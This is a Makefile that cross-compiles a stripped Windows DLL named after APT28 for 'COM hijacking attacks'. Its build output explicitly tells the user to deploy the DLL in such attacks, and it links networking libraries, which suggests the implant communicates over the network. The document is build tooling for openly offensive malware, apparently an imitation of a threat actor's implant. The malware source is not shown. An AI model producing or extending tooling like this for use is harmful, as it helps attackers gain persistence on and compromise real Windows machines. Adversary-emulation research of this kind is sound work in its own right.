# Makefile for APT28 DLL (COM Hijacking)

CC = x86_64-w64-mingw32-gcc
WINDRES = x86_64-w64-mingw32-windres
STRIP = x86_64-w64-mingw32-strip

# Target DLL name
TARGET = apt28.dll

# Source files
SRC_DIR = src
SOURCES = $(SRC_DIR)/main.c

# Output directory
BUILD_DIR = build

# Compiler flags
CFLAGS = -Wall -O2 -s -ffunction-sections -fdata-sections
LDFLAGS = -shared -Wl,--subsystem,windows -Wl,--gc-sections -Wl,--strip-all

# Libraries
LIBS = -lws2_32 -lwininet -lgdi32 -lole32 -loleaut32 -luuid

# Module definition file
DEF_FILE = $(SRC_DIR)/exports.def

# Default target
all: $(BUILD_DIR)/$(TARGET)

# Create build directory
$(BUILD_DIR):
	mkdir -p $(BUILD_DIR)

# Build DLL
$(BUILD_DIR)/$(TARGET): $(SOURCES) $(DEF_FILE) | $(BUILD_DIR)
	$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $(SOURCES) $(DEF_FILE) $(LIBS)
	@echo "[+] DLL built successfully: $@"
	@echo "[+] Use this DLL for COM hijacking attacks"

# Clean build artifacts
clean:
	rm -rf $(BUILD_DIR)

# Install (copy to a dist directory)
install: all
	mkdir -p dist
	cp $(BUILD_DIR)/$(TARGET) dist/
	@echo "[+] DLL copied to dist/"

.PHONY: all clean install
